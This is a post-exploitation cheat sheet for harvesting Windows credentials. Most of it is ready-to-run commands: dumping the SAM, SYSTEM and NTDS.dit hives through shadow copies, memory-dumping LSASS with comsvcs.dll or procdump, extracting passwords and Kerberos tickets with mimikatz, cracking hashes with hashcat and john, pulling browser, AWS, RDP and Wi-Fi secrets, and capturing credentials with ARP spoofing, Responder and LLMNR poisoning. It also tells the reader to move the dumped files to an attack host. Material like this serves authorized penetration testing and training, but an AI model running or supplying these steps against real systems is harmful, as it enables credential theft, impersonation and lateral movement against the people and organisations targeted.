# Local Account Passwords

#### Enumerating Local User Accounts

- List all local user accounts:
	```powershell
	Get-LocalUser
	```

#### Cached Domain Credentials

Windows may cache domain credentials locally, allowing users to log in without contacting the domain controller when it's unavailable. Cached domain credentials are stored in the registry in an encrypted format.

- Query Cached Domain Credentials:
	Cached domain credentials are stored in the registry and can be retrieved using the following command:
	```powershell
	reg query "HKLM\SECURITY\Cache"
	```
  Cached hashes are stored as binary data and cannot be directly decoded using PowerShell. External tools such as `mimikatz` are required to decode these cached credentials.

#### Group Policy Preferences (GPP) Credential Storage

Group Policy Preferences (GPP) can store sensitive credentials, such as local administrator passwords, in XML files. If not properly secured, these credentials may be retrievable in plaintext.

- Search for GPP files:
	You can search the filesystem for `Groups.xml` files that may contain stored credentials:
	```powershell
	Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "Groups.xml" }
	```

- Location of GPP files containing potential plaintext credentials:
	GPP files are often found in the following directory and may contain passwords in the `cpassword` field:
	```plaintext
	C:\ProgramData\Microsoft\Group Policy\History\<GPO GUID>\Machine\Preferences\Groups\Groups.xml
	```

- Extract the `cpassword` from GPP XML files:
	You can parse the `Groups.xml` file to extract the `cpassword` field (which contains the encrypted password):
	```powershell
	(Get-Content "C:\Path\To\Groups.xml").Select-String -Pattern "cpassword"
	```

# Credential Files and Cleartext Passwords

#### Searching for Sensitive Information
- Find Files Containing Passwords:
	Use PowerShell to recursively search the file system for files that may contain the keyword "password". This can be helpful for identifying files with stored credentials.
	```powershell
	Get-ChildItem -Path C:\ -Recurse -Include *password* -ErrorAction SilentlyContinue | Select-String -Pattern "password" | Out-File "C:\Path\To\Outfile.txt"
	```
	- This command recursively searches for files with "password" in the file name or content. The results are saved to the specified output file.

- Search for Configuration Files Containing Passwords:
	Search for common configuration file types such as `.config`, `.xml`, or `.ini` that may contain sensitive information, including credentials.
	```powershell
	Get-ChildItem -Path C:\ -Recurse -Include *.config,*.xml,*.ini -ErrorAction SilentlyContinue | Select-String -Pattern "password" | Out-File "C:\Path\To\Outfile.txt"
	```
	- This command searches for known configuration file formats and looks for occurrences of the string "password". The results are written to the specified output file.

#### Examining System Files for Credentials
- Check for Plaintext Passwords in Configuration Files:
	Inspect specific files (such as configuration files) for the occurrence of passwords in plaintext.
	```powershell
	Get-Content C:\Path\To\Config\File.txt | Select-String -Pattern "password" | Out-File "C:\Path\To\Outfile.txt"
	```
	- This command reads the contents of a file and searches for the string "password". Use this to manually inspect sensitive configuration files for credentials.

#### Searching for Unattended Windows Installations
When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
	- `C:\Unattend.xml`
	- `C:\Windows\Panther\Unattend.xml`
	- `C:\Windows\Panther\Unattend\Unattend.xml`
	- `C:\Windows\system32\sysprep.inf`
	- `C:\Windows\system32\sysprep\sysprep.xml`

#### Searching for Cleartext Credentials in the Registry
Some applications store passwords in cleartext or weakly encrypted formats within the registry. These entries can be queried using PowerShell.
- Search the Registry for Passwords:
	You can recursively search the registry for any keys or values that contain the word "password":
	```powershell
	Get-ChildItem -Path HKCU:\ -Recurse | Get-ItemProperty | Where-Object { $_.PSObject.Properties.Name -match "password" } | Out-File "C:\Path\To\Outfile.txt"
	```
	- This command searches the `HKEY_CURRENT_USER (HKCU)` hive of the registry for any properties that match the string "password". You can extend the path to other registry hives such as `HKLM:\` for system-wide searches.

#### Look for Cached Plaintext Credentials (Winlogon):
- Some systems may have cached plaintext credentials, especially in older or insecure configurations. Check for cached credentials stored by administrators for convenience in the registry:
	```powershell
	reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultPassword"
	```
	- This command checks the `Winlogon` registry key for any cached default username and password values, which are sometimes used for auto-login configurations.

#### Saved Windows Credentials
- Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:
	```powershell
	runas /savecred /user:admin cmd.exe
	```

#### PowerShell History
- Whenever a user runs a command using PowerShell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the PowerShell command line, it can later be retrieved by using the following command from a cmd.exe prompt:
```powershell
type $env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
#### IIS Configuration
- Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find `web.config` in one of the following locations:
	- `C:\inetpub\wwwroot\web.config`
	- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
```powershell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

#### SSH Keys
- Search for SSH Keys:
	SSH private keys are often stored in files like `id_rsa` or `id_dsa`. Use PowerShell to search for such files across the filesystem:
	```powershell
	Get-ChildItem -Path C:\ -Recurse -Include *id_rsa*,*id_dsa* -ErrorAction SilentlyContinue
	```
	- This command recursively searches for SSH private key files, which may contain sensitive credentials that could grant unauthorized access to SSH servers.

# VHDX Files

#### Locating VHDX Files

In a post-exploitation scenario, your first goal is to identify VHDX files on the target system. VHDX files typically end with the extension `.vhdx`, and they are often found in directories associated with Hyper-V or backup storage.

- Use the following PowerShell command to search for all VHDX files on the system:
	```powershell
	Get-ChildItem -Path C:\ -Recurse -Include *.vhdx -ErrorAction SilentlyContinue | Out-File "C:\Path\To\Outfile.txt"
	```
- This command recursively searches through the file system starting from the root of the `C:\` drive for any files with a `.vhdx` extension and stores the results in the specified output file.

#### Mounting VHDX Files

Once you have identified VHDX files, the next step is to mount them to access their contents. Windows provides native support for mounting virtual disks.

- Use the following PowerShell command to mount the VHDX file:
	```powershell
	Mount-VHD -Path "C:\Path\To\VHDX\File.vhdx"
	```
- This command mounts the specified VHDX file, making its contents available as a virtual drive (usually assigned a drive letter like `E:` or `F:`).

# SAM Database and NTLM Hashes

#### Prerequisites

- Administrator privileges or SYSTEM-level access on the target machine are required to extract password hashes from the SAM (Security Account Manager) database.
- For domain-joined machines, the SECURITY hive is beneficial to extract additional credentials such as cached domain credentials.

#### Extracting NTLM Hashes from the SAM Database

1. Extract from Registry Hives: 
   To extract NTLM password hashes, you need to obtain copies of the SYSTEM, SAM, and optionally, the SECURITY registry hives. The following PowerShell commands will save these hives to a specified location on the file system.
   
    ```powershell
    reg save HKLM\SAM C:\temp\SAM
    reg save HKLM\SYSTEM C:\temp\SYSTEM
    reg save HKLM\SECURITY C:\temp\SECURITY
    ```

   - SAM Hive: Stores user account details and encrypted password hashes.
   - SYSTEM Hive: Contains the boot key necessary to decrypt the SAM.
   - SECURITY Hive (optional): Stores LSA secrets, which may contain cached domain credentials on domain-joined machines.

2. Transfer Hives to the Attack Host: 
   After extracting the registry hives, transfer them to your attack machine for offline analysis. You can use any method such as SCP, SMB, or any other exfiltration technique.

3. Extract NTLM Hashes from the SAM Database:
   Use `impacket-secretsdump` to extract NTLM hashes from the registry hives. This tool decrypts the SAM database using the SYSTEM hive's boot key and extracts the hashes for all local user accounts.

    ```bash
    impacket-secretsdump -sam C:\temp\SAM -security C:\temp\SECURITY -system C:\temp\SYSTEM LOCAL
    ```

   - If you only have the SAM and SYSTEM hives, the command can still extract local user account NTLM hashes. However, including the SECURITY hive allows you to extract additional credentials like LSA secrets.

4. Offline Hash Cracking: 
   After extracting NTLM hashes, you can attempt to crack the passwords using tools such as `hashcat` or `john the ripper`. NTLM hashes are presented in the format:
   
    ```plaintext
    username:rid:lmhash:nthash:::
    ```

   - Cracking NTLM hashes with hashcat: Use the following command to perform a dictionary attack on the extracted NTLM hashes. In this case, the `-m 1000` option specifies the NTLM hash type.

    ```bash
    sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
    ```

   - Cracking NTLM hashes with john the ripper: Similarly, you can use `john` to crack NTLM hashes with a wordlist.

    ```bash
    john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
    ```

#### Volume Shadow Copy Service (VSS)
If the SAM and SYSTEM files are locked or in use, you can bypass this restriction by using the Volume Shadow Copy Service (VSS) to create a shadow copy of the system. This allows you to access these files while the system is running.

1. Create a Volume Shadow Copy:
   - Use `vssadmin` to create a shadow copy of the system drive:
   ```powershell
   vssadmin create shadow /for=C:
   ```

2. Find the Path to the Shadow Copy:
   - List all shadow copies to identify the path to the newly created shadow copy:
   ```powershell
   vssadmin list shadows
   ```

3. Copy the SAM, SYSTEM, and SECURITY Files from the Shadow Copy:
   - Use PowerShell to copy the files from the shadow copy to a temporary directory for further analysis:
   ```powershell
   Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<Shadow_ID>\Windows\System32\config\SAM" C:\temp\SAM
   Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<Shadow_ID>\Windows\System32\config\SYSTEM" C:\temp\SYSTEM
   Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<Shadow_ID>\Windows\System32\config\SECURITY" C:\temp\SECURITY
   ```

   Replace `<Shadow_ID>` with the ID of the shadow copy found using `vssadmin list shadows`.

# NTDS.dit

The `NTDS.dit` file on a Domain Controller contains the Active Directory database, including all domain user password hashes. If the machine is a Domain Controller, the `NTDS.dit` file can be extracted along with the `SYSTEM` registry hive for further analysis.

#### Extracting `NTDS.dit`

1. Using Volume Shadow Copy to Extract NTDS.dit (requires Domain Admin privileges):

   Volume Shadow Copy can be used to safely copy the `NTDS.dit` and `SYSTEM` files, even when they are locked by the system:
   ```powershell
   vssadmin create shadow /for=C:
   ```

   Once the shadow copy is created, use the following commands to copy the `NTDS.dit` and `SYSTEM` files:

   ```powershell
   Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<Shadow_ID>\Windows\NTDS\NTDS.dit" C:\temp\NTDS.dit
   Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<Shadow_ID>\Windows\System32\config\SYSTEM" C:\temp\SYSTEM
   ```

   - `<Shadow_ID>`: Replace this with the actual Shadow Copy ID returned by `vssadmin`.
   - These files will be saved to the `C:\temp\` directory.

2. Extracting Password Hashes from NTDS.dit:

   Once you have both the `NTDS.dit` and `SYSTEM` files, you can extract password hashes using offline tools like `ntdsutil`, `secretsdump.py` (from the Impacket toolkit), or other Active Directory forensics tools.

   Example using `secretsdump.py` from the Impacket toolkit:
   ```bash
   impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
   ```

   - The `-ntds` option specifies the path to the `NTDS.dit` file.
   - The `-system` option specifies the path to the `SYSTEM` hive.
   - `LOCAL` indicates that you're running the extraction locally, without needing to connect to a remote machine.

   This will dump all the credentials stored in the Active Directory database, including password hashes, Kerberos keys, and more. These credentials can then be used for further exploitation, such as cracking passwords or performing pass-the-hash attacks.

# LSASS Dump

#### Prerequisites
- Administrator privileges or SYSTEM-level access on the target machine.

#### Extracting NTLM Hashes from LSASS Memory Dump

1. Dump LSASS Process Using Task Manager:
	- Method 1: Task Manager:
		1. Open Task Manager.
		2. Go to the Processes tab.
		3. Find and right-click on the Local Security Authority Process (lsass.exe).
		4. Select Create dump file.
		5. The dump file `lsass.DMP` will be created and saved in:
			```plaintext
			C:\Users\<logged_on_user>\AppData\Local\Temp
			```

	- Method 2: Using comsvcs.dll:
		1. Find the Process ID (PID) of the `lsass.exe` process:
			```powershell
			Get-Process lsass
			```
		2. Dump the `lsass.exe` memory using `rundll32.exe` and `comsvcs.dll`:
			```powershell
			rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full
			```

	- Method 3: Using ProcDump:
		1. Download `procdump` from [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump):
			```powershell
			Invoke-WebRequest -Uri "http://live.sysinternals.com/procdump.exe" -OutFile "C:\Windows\Temp\procdump.exe"
			```
		2. Use `procdump` to extract the `lsass.exe` memory dump:
			```powershell
			procdump -accepteula -ma lsass.exe C:\temp\lsass.dmp
			```

2. Transfer `lsass.DMP` to Attack Host:
   Transfer the memory dump to the attack machine for analysis. Use secure methods like `SCP`, `SMB`, or any file transfer tool appropriate for the situation.

3. Extract NTLM Hashes from LSASS Dump Using Mimikatz:
   On your attack host, use `mimikatz` to extract NTLM hashes from the memory dump:
	```powershell
	.\mimikatz.exe "sekurlsa::minidump C:\temp\lsass.dmp" "sekurlsa::logonPasswords" exit
	```
   This command will parse the memory dump and retrieve stored credentials, including NTLM hashes, plain-text passwords (if available), and Kerberos tickets.

4. Offline NTLM Hash Cracking:
   After extracting the NTLM hashes, use tools like `hashcat` or `john` to crack them. The NTLM hash format extracted by Mimikatz looks like this: `username:rid:lmhash:nthash:::`.
   
   - Crack with Hashcat:
		```bash
		sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
		```

   - Crack with John the Ripper:
		```bash
		john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
		```
  
# Credential Manager

Windows Credential Manager stores saved credentials, such as passwords for applications, network shares, VPNs, and other services. Attackers with appropriate privileges can extract these credentials to gain access to further systems or services.

#### Prerequisites
- Administrator privileges or SYSTEM-level access on the target machine.
- Can only retrieve credentials for which you have access rights.

#### Extract Credentials from Credential Manager

1. List Stored Credentials:
   PowerShell allows you to list the credentials stored in the Windows Credential Manager using the `cmdkey` utility:
   ```powershell
   cmdkey /list
   ```

2. Extract Specific Credentials:
   To extract credentials for a specific target (such as a server or service), use:
   ```powershell
   cmdkey /list:target=<target_name>
   ```

3. Export Credentials Using PowerShell:
   While you cannot directly export credentials from the Credential Manager in plaintext via PowerShell, you can export other credential types (such as those entered manually via `Get-Credential`). This command saves the credentials to an XML file for later use:
   ```powershell
   Get-Credential | Export-Clixml -Path "C:\temp\credentials.xml"
   ```

4. Import Credentials from File:
   You can later import and reuse the credentials from the XML file:
   ```powershell
   $creds = Import-Clixml -Path "C:\temp\credentials.xml"
   ```

#### Extract Credentials via `vaultcmd`

1. Extract Credentials from Windows Vault Using `vaultcmd`:
   Windows stores certain types of credentials in the Credential Manager vault, which can be accessed using the `vaultcmd` utility. This command lists stored Windows credentials:
   ```powershell
   vaultcmd /listcreds:"Windows Credentials"
   ```

2. Extract and Display Credentials for a Specific Target Using PowerShell:
   PowerShell can also directly access the Credential Manager vault using the COM object `Microsoft.Windows.Security.Credentials.Vault`. This method allows retrieving stored credentials programmatically:
   ```powershell
   $Vault = New-Object -ComObject Microsoft.Windows.Security.Credentials.Vault
   $Vault.Retrieve("target")
   ```

# Password Extracting from Memory

#### Using Mimikatz

- Invoke-Mimikatz (PowerShell Script):
  You can use PowerShell to execute Mimikatz and dump passwords from memory, including plaintext passwords if they are still available. This is especially effective for extracting credentials from the Local Security Authority Subsystem Service (LSASS).
	```powershell
	Import-Module .\Invoke-Mimikatz.ps1
	Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"
	```
	- The `privilege::debug` command elevates the privileges to enable memory access, and `sekurlsa::logonpasswords` retrieves credentials from memory.

- Extracting Kerberos Tickets:
  Mimikatz can also extract Kerberos tickets, which are useful in pass-the-ticket attacks. These tickets allow attackers to impersonate a user and authenticate against services without knowing the user's password.
	```powershell
	Invoke-Mimikatz -Command 'sekurlsa::tickets /export'
	```
	- This command exports the available Kerberos tickets from memory, which can be reused or analyzed for further exploitation.

# Domain Credentials and Tickets

#### Extracting Kerberos Tickets

Kerberos tickets, including Ticket Granting Tickets (TGTs) and service tickets, can be extracted from memory and used for pass-the-ticket attacks to impersonate users in a Windows domain environment.

1. List Current Kerberos Tickets:
   Retrieve a list of all Kerberos tickets currently associated with your session.
   ```powershell
   klist
   ```
   This command shows the current Ticket Granting Ticket (TGT) and any service tickets that have been issued to the user.

2. Dump Kerberos Tickets for Other Users:
   To retrieve Kerberos tickets for other users, such as domain accounts, you can use external tools like `mimikatz` to dump the tickets from memory. This can be achieved with the following PowerShell command:
   ```powershell
   Invoke-Mimikatz -Command 'kerberos::list'
   ```
   This command will display the Kerberos tickets stored in memory, which can then be extracted and used in pass-the-ticket attacks. To capture and reuse tickets, you would typically export them using:
   ```powershell
   Invoke-Mimikatz -Command 'kerberos::list /export'
   ```
   The tickets will be saved in `.kirbi` format, which can later be used to authenticate as the user by loading them into the current session.

# Service Account Credentials

#### Extracting Windows Service Credentials

Service accounts are often used to run Windows services and may contain privileged credentials that can be useful for lateral movement or privilege escalation. These accounts can be identified by inspecting the service configuration.

- Enumerate all Windows services and their configurations:
	```powershell
	Get-WmiObject -Class Win32_Service | Select-Object DisplayName, StartName, State
	```
	This command lists the display name of each service, the account used to start it, and its current state (e.g., running, stopped).

- Check for services running as specific user accounts:
	By default, many services run under system accounts like `LocalSystem`, `LocalService`, or `NetworkService`. However, some services may be running as domain or local user accounts, which may have sensitive credentials.
	```powershell
	Get-WmiObject -Class Win32_Service | Where-Object { $_.StartName -notmatch "LocalSystem|LocalService|NetworkService" } | Select-Object DisplayName, StartName
	```
	This command filters out services running as the default system accounts, focusing on those running under specific user accounts.

- Query detailed service information for further inspection:
	If a service is running as a specific user account, you can retrieve more details about its configuration:
	```powershell
	Get-WmiObject -Class Win32_Service -Filter "StartName='<username>'" | Select-Object DisplayName, StartName, PathName, StartMode
	```
	This retrieves the service path and startup mode, which may be useful for analyzing potential service vulnerabilities or credential storage mechanisms.

#### Extracting IIS Application Pool Credentials

IIS (Internet Information Services) Application Pools often run under specific user accounts and may have stored credentials that can be extracted if misconfigured.

- List all IIS Application Pools and their configurations:
	```powershell
	Import-Module WebAdministration
	Get-WebConfiguration -Filter "system.applicationHost/applicationPools/add" | Select-Object -ExpandProperty Name
	```
	This command lists all application pools configured on the IIS server.

- Retrieve application pool identities and account information:
	For each application pool, you can retrieve the identity used to run it. This identity may reveal whether the pool is running under a specific user account.
	```powershell
	Get-WebConfigurationProperty -Filter "system.applicationHost/applicationPools/*" -Name "processModel.identityType"
	```

- Check for application pools running under custom user accounts:
	You can identify application pools running under custom or domain user accounts instead of the default identities like `ApplicationPoolIdentity`:
	```powershell
	Get-WebConfigurationProperty -Filter "system.applicationHost/applicationPools/add" -Name "processModel.userName" | Where-Object { $_.Value -ne "" }
	```
	If the result is not empty, it means a custom user account is configured for the application pool, which may have stored credentials.

# Credential Harvesting via WMI and DCOM

WMI (Windows Management Instrumentation) and DCOM (Distributed Component Object Model) are remote management and execution frameworks used on Windows systems. With administrative privileges, it is possible to harvest authentication credentials or execute commands remotely using these frameworks. The following commands enable you to enumerate remote connections and processes, potentially exposing credentials used in these contexts.

#### Listing Remote WMI Connections

- List remote WMI connections:
	This command lists users who have established WMI connections on a remote host. This can include cached credentials from domain accounts:
	```powershell
	Get-WmiObject -Class Win32_NetworkLoginProfile -ComputerName <remote_host>
	```

#### Listing Remote Connections via WMI/COM (Requires Admin Privileges)

- List remote processes running via WMI/COM:
	This command lists processes like `svchost.exe` that are running on a remote system, which can help identify services that may be using stored credentials:
	```powershell
	Get-WmiObject -Namespace root\cimv2 -Query "Select * from Win32_Process Where Name = 'svchost.exe'"
	```
  This information can assist in identifying processes running under privileged accounts, which may store credentials.

#### Harvesting Credentials via DCOM

- List DCOM applications for potential credential exposure:
	DCOM often manages remote processes that may store or use credentials. You can list DCOM applications and their configurations with the following command:
	```powershell
	Get-WmiObject -Namespace "root\Microsoft\Windows\DCOMApp" -Class __Namespace
	```
  While this command itself won't directly retrieve credentials, it lists applications that could be further inspected for credential information.

# Extracting Credentials from Specific Applications

#### Windows Remote Management (WinRM)

- Check if WinRM is enabled:
	WinRM is a service that allows remote management of Windows machines. To check if it is enabled and listening for connections:
	```powershell
	winrm enumerate winrm/config/listener
	```

#### Remote Desktop Protocol (RDP)

Remote Desktop Protocol (RDP) stores credentials for convenience in various places. These credentials can sometimes be harvested.

1. List Saved RDP Credentials:
	Stored credentials for Remote Desktop sessions can be found under the user's registry profile:
	```powershell
	Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Terminal Server Client\Servers'
	```

2. Check for Default RDP Credentials:
	Look for any default credentials saved for Remote Desktop connections in this registry path:
	```powershell
	Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Terminal Server Client\Default'
	```

3. Retrieve RDP Credentials from RDP Files:
	`.rdp` files used to store connection settings may also contain cached credentials (encrypted). These credentials include fields like `username:s:`, `domain:s:`, and `password 51:b:`, which can be decrypted using tools like `mimikatz`. You can search the system for RDP files:
	```powershell
	Get-ChildItem -Path C:\ -Recurse -Include *.rdp -ErrorAction SilentlyContinue
	```

#### Remote Desktop Connection Manager (RDCMan)

Remote Desktop Connection Manager (RDCMan) is a Microsoft tool for managing multiple RDP sessions, and it can store credentials in XML-based configuration files.

- Extract RDCMan Credentials:
	RDCMan configurations are stored in `.settings` XML files. You can extract credentials by searching for password fields:
	```powershell
	Get-Content "C:\path\to\RDCMan.settings" | Select-String -Pattern "password"
	```

#### VNC (Virtual Network Computing)

VNC clients may store weakly encrypted passwords in their configuration files or the Windows registry. These credentials can be retrieved if access is available.

- Extract VNC Password from the Registry:
	VNC passwords are often stored in the registry, which can be queried for potential credential information:
	```powershell
	reg query "HKCU\Software\RealVNC\WinVNC4"
	```

#### Microsoft Outlook

Microsoft Outlook stores email account credentials in user profiles. These profiles can be queried for credential information.

- Extracting Passwords from Outlook Profiles:
	The following PowerShell command lists saved Outlook profiles and associated properties, which may contain encrypted passwords or connection information:
	```powershell
	Get-ItemProperty -Path "HKCU:\Software\Microsoft\Office\Outlook\Profiles" | Format-List
	```

# Web Browsers

Browsers store saved passwords, which can be extracted using various PowerShell methods. Each browser has different mechanisms for storing credentials, such as encrypted databases or files.

#### Extract Saved Browser Passwords

- Microsoft Internet Explorer and Edge:
	Internet Explorer and Microsoft Edge use the Windows Credential Locker to store passwords. Some information about saved forms can also be extracted from the registry:
	```powershell
	Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\IntelliForms\Storage2"
	```
	This command retrieves information related to form data stored by Internet Explorer and Edge. For credentials, use the Credential Manager method listed below.

- Mozilla Firefox:
	Firefox stores its user data, including saved passwords, in its profile directory. You can list the profile directories to identify where Firefox stores its saved passwords and other sensitive data:
	```powershell
	Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Recurse
	```
	Password data is stored in encrypted format, typically in the `logins.json` file and secured with a master password (if set). To decrypt these passwords, tools like `NirSoft WebBrowserPassView` or custom scripts may be required.

- Google Chrome:
	Chrome stores passwords in an encrypted SQLite database located in the user profile directory. You can locate the database using:
	```powershell
	Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
	```
	This SQLite database contains encrypted passwords. To decrypt the passwords, you'll need the DPAPI master key, which can be retrieved using external tools like `mimikatz` or `SharpDPAPI`.

- Extracting and Decrypting Passwords:
	For all browsers, after identifying the location of the password files or databases, further steps involve:
	1. Extracting the SQLite database (for Chrome/Firefox).
	2. Decrypting the stored credentials using DPAPI or browser-specific decryption methods.

#### Extracting Credentials via Credential Manager

For Internet Explorer and Edge, saved passwords are also stored in the Windows Credential Manager. To access the Credential Manager and view the stored credentials:
```powershell
rundll32.exe keymgr.dll, KRShowKeyMgr
```
This command will open the graphical user interface to view and manage stored web credentials for Internet Explorer and Edge.

#### Browser Session Cookies

Cookies stored by web browsers may contain session tokens, authentication cookies, or other credential-related information.

- Extract Cookies from Browsers:
	Cookies are stored in various locations depending on the browser. For example, in Internet Explorer, they are stored in the following path:
	```powershell
	$cookiePath = "$env:APPDATA\Microsoft\Windows\Cookies"
	Get-ChildItem $cookiePath
	```
	For Chrome and Firefox, cookies are typically stored in SQLite databases (`Cookies` database in the browser profile). These databases can be accessed and extracted in a similar manner to password databases. Further processing is required to retrieve and analyze the cookies.

# Remote File Shares

#### Enumerating SMB Shares and Access

- List available SMB shares on a remote host:
	Use the following command to retrieve a list of SMB shares from a remote computer. This requires administrative privileges on the remote host:
	```powershell
	Invoke-Command -ScriptBlock { Get-SmbShare } -ComputerName <target_ip>
	```

	Alternatively, to list SMB shares on the local system:
	```powershell
	Get-SmbShare
	```

- Check for accessible SMB shares:
	You can verify if specific SMB shares on a remote host are accessible using the `Test-SmbConnection` cmdlet. This tests the connection to the remote host’s SMB service:
	```powershell
	Test-SmbConnection -ComputerName <target_ip>
	```

	You can also check access to specific shares using the following:
	```powershell
	Invoke-Command -ComputerName <target_ip> -ScriptBlock {
		Get-SmbShareAccess -Name <share_name>
	}
	```

#### Enumerating SMB Sessions and Open Files

- Enumerate active SMB sessions:
	List the currently active SMB sessions to see which users have open connections to SMB shares:
	```powershell
	Get-SmbSession
	```

	This command shows active users, their IP addresses, authentication status, and session details. You may need administrative privileges to run this command on remote machines.

- List open files on SMB shares:
	To display a list of currently open files on SMB shares, along with the associated users and file paths:
	```powershell
	Get-SmbOpenFile
	```

	This command lists files currently being accessed over SMB, useful for monitoring or identifying users actively working with shared files.

# Cloud Services

#### Azure AD Credentials

Azure Active Directory (Azure AD) credentials and user information can be enumerated using the appropriate PowerShell modules. Ensure that the necessary Azure PowerShell module (such as `AzureAD`) is installed and that you are authenticated to Azure before running these commands.

- Enumerate Azure AD users:
	```powershell
	Get-AzureADUser -All $true | Select-Object UserPrincipalName, DisplayName
	```
	This command lists all Azure AD users along with their UserPrincipalName (UPN) and display names.

- Enumerate Azure AD groups:
	```powershell
	Get-AzureADGroup -All $true | Select-Object DisplayName, Description
	```
	This command lists all Azure AD groups along with their display names and descriptions.

#### Harvesting AWS Credentials

AWS credentials are often stored in a file in the user's profile directory. These credentials may be used for programmatic access to AWS resources. You can retrieve the stored credentials using PowerShell.

- List stored AWS credentials:
	```powershell
	Get-Content "$env:USERPROFILE\.aws\credentials"
	```
	This command reads the contents of the AWS credentials file stored at the specified path (`$env:USERPROFILE\.aws\credentials`). The file typically contains access keys (`aws_access_key_id` and `aws_secret_access_key`) that are used to authenticate with AWS services.

# Network Traffic

#### Harvesting Credentials via ARP Spoofing

- Using `Ettercap` for ARP Spoofing:
	Perform an ARP spoofing attack to intercept traffic between a target machine and its gateway.
	```bash
	ettercap -T -M arp:remote // <target_ip> // <gateway_ip>
	```

- Combine ARP Spoofing with Packet Capture Using `Wireshark`:
	To intercept credentials over cleartext protocols like HTTP or NTLM:
	1. Start ARP spoofing using `Ettercap` as shown above.
	2. Open Wireshark and begin capturing traffic on the same network interface.
	3. Use the following Wireshark filters to focus on cleartext protocols:
		- Filter for HTTP traffic:
			```bash
			http
			```
		- Filter for NTLM authentication:
			```bash
			ntlm
			```
	4. Inspect the captured packets for credentials transmitted in plaintext or poorly protected forms.

#### Harvesting Credentials via DNS Spoofing

- Using `dnsspoof` for DNS Spoofing:
	Conduct a DNS spoofing attack to redirect traffic intended for legitimate domains to a malicious server.
	```bash
	dnsspoof -i eth0 -f hosts.txt
	```

- Redirect Traffic and Harvest Credentials Using `Responder`:
	`Responder` can capture credentials by tricking clients into sending authentication requests through spoofed DNS responses:
	1. Create `hosts.txt`: Define the target domains you want to spoof, e.g.:
		```plaintext
		www.example.com 192.168.1.100
		```
	2. Run Responder to capture authentication attempts and credentials:
		```bash
		responder -I eth0 -rdw
		```

#### Harvesting Credentials with Scripts

- Using `Inveigh` for LLMNR/NBNS Poisoning:
	`Inveigh` is a PowerShell tool that can poison LLMNR and NBNS traffic to capture NTLMv1/NTLMv2 hashes.
	```powershell
	Invoke-Inveigh -NBNS -LLMNR -ConsoleOutput Y
	```

- Capture Credentials Using `Responder`:
	Run `Responder` externally (on a Linux host or another platform) to capture credentials by poisoning network protocols like LLMNR and NBNS.
	```bash
	responder -I eth0 -rdw
	```

# Miscellaneous Credential Locations

#### Harvest Credentials from PowerShell History

PowerShell keeps a history of executed commands, which may contain sensitive information such as passwords or authentication tokens if they were entered in plain text.

- Retrieve PowerShell history:
    ```powershell
    Get-Content (Get-PSReadlineOption).HistorySavePath
    ```
  This command retrieves the contents of the PowerShell history file. Always check the history for sensitive information, such as credentials that may have been entered during administrative sessions.

#### Check AutoLogon Credentials

AutoLogon is a feature that allows automatic login for specific user accounts, and sometimes plaintext credentials are stored in the Windows Registry for this feature.

- Query AutoLogon settings:
    ```powershell
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    ```
  This command retrieves AutoLogon settings, including the `DefaultUserName`, `DefaultPassword`, and `AutoAdminLogon` fields. If the `DefaultPassword` field is populated, it contains the plaintext password for the AutoLogon user.

#### Extracting Wi-Fi Passwords

Saved Wi-Fi profiles on a Windows system often include credentials (such as WPA/WPA2 keys) in plaintext. These credentials can be extracted using the `netsh` command.

- List saved Wi-Fi profiles:
    ```powershell
    netsh wlan show profiles
    ```

- Dump credentials for a specific Wi-Fi profile:
    ```powershell
    netsh wlan show profile name="<Wi-Fi Profile Name>" key=clear
    ```
  The `key=clear` option reveals the Wi-Fi credentials, and under the "Key Content" section, the Wi-Fi password is displayed in cleartext.
